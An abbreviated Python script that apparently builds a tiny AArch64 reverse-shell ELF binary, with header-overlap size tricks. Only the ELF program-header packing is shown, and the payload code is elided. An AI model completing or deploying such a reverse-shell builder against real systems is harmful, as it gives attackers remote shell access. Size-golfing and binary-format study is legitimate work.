#!/usr/bin/env python3
"""
Downsized AArch64 Reverse Shell ELF (~208 bytes).
Header overlap: e_phoff=0x3C → 116-byte combined header.
Sockfd stored in stack push alongside sockaddr (saves 4 bytes in code).
Data in clobberable ELF header fields.
"""
...
def build_elf(raw_code):
    ...
    # PHDR at 0x3C
    struct.pack_into('<I', h, 0x3C, 1)            # p_type (e_shnum=1, e_shstrndx=0)
    struct.pack_into('<I', h, 0x40, 7)            # p_flags
    struct.pack_into('<Q', h, 0x44, 0)            # p_offset
